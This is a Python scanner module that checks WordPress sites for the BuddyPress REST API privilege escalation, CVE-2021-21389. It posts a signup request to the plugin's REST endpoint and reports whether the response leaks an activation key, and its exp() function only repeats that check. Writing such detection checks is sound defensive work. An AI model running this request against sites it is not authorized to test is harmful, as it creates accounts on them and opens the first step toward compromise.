import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''BuddyPress REST API Privilege Escalation to RCE''',
        "description": '''The BuddyPress WordPress plugin was affected by an REST API Privilege Escalation to RCE''',
        "severity": "high",
        "references": [
            "https://github.com/HoangKien1020/CVE-2021-21389", 
            "https://buddypress.org/2021/03/buddypress-7-2-1-security-release/", 
            "https://codex.buddypress.org/releases/version-7-2-1/", 
            "https://github.com/buddypress/BuddyPress/security/advisories/GHSA-m6j4-8r7p-wpp3"
        ],
        "classification": {
            "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
            "cvss-score": "",
            "cve-id": "CVE-2021-21389",
            "cwe-id": "CWE-863"
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["cve", "cve2021", "wordpress", "wp-plugin", "rce"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/wp-json/buddypress/v1/signup"""
        method = "POST"
        data = """{
  "user_login":"{{randstr}}",
  "password":"{{randstr}}",
  "user_name":"{{randstr}}",
  "user_email":"{{randstr}}@example.com"
}"""
        headers = {'Content-Type': 'application/json; charset=UTF-8'}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if (resp0.status_code == 200) and ("""application/json""" in str(resp0.headers)) and ("""user_login""" in resp0.text and """registered""" in resp0.text and """activation_key""" in resp0.text and """user_email""" in resp0.text):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url